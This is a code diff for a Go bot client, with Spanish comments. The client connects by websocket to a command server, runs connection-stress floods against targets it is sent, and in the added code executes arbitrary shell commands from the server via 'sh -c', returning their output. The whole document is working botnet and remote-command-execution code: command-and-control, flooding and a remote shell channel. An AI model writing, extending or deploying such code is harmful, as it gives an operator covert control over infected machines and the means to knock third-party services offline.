@@ -2,10 +2,12 @@ package main
 
 import (
 	"context"
+	"fmt"
 	"io"
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"sync"
 	"time"
 
@@ -19,7 +21,7 @@ type ClientInfo struct {
 }
 
 var (
-	CENTRALITA_IP = "ws://192.168.1.54:8080/ws"
+	CENTRALITA_IP = "ws://192.168.1.103:8080/ws" // TODO: cambiar esta patraña
 	cancelFunc    context.CancelFunc
 
 	// cosas de intensidad
@@ -79,8 +81,13 @@ func getLocalIP() string {
 	return "unknown"
 }
 
-func main() {
+func executeShellCommand(command string) (string, error) {
+	cmd := exec.Command("sh", "-c", command)
+	output, err := cmd.CombinedOutput()
+	return string(output), err
+}
 
+func main() {
 	wsURL := CENTRALITA_IP
 
 	for {
@@ -112,18 +119,34 @@ func main() {
 			// 	aqui van las ordenes que se pueden recibir de la centralita
 			switch msg["action"] {
 			case "START":
-				if cancelFunc != nil {cancelFunc()}
+				if cancelFunc != nil { cancelFunc() }
 
 				ctx, cancel := context.WithCancel(context.Background())
 				cancelFunc = cancel
 
-				go StressConnections(ctx, msg["payload"], concurrencia) // ajusta concurrencia aquí
+				go StressConnections(ctx, msg["payload"], concurrencia)
 
 			case "STOP":
 				if cancelFunc != nil {
 					cancelFunc()
 					cancelFunc = nil
 				}
+
+			case "SHELL":
+				command := msg["payload"]
+				fmt.Printf("ejecutando: %s\n", command)
+
+				output, err := executeShellCommand(command)
+				if err != nil { output = fmt.Sprintf("error: %v", err) }
+
+				// enviamos la respuesta, realmente no es un shell
+				response := map[string]string{
+					"action": "SHELL_RESULT",
+					"payload": output,
+				}
+
+				if err := conn.WriteJSON(response); err != nil { fmt.Println("error de envío:", err) }
+
 			}
 		}
 	}
